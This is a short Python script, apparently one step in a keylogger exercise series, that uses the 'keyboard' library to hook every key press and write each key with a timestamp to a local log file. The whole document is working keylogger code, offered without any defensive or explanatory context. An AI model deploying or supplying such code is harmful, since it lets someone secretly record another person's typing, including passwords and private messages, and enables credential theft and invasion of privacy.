import keyboard
import logging


logging.basicConfig(filename=(f'2_keylog_keyboard.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")


def keypress_callback(event):
    key_pressed = event.name
    print(key_pressed)
    logging.info(str(key_pressed))


keyboard.on_press(keypress_callback)
keyboard.wait()
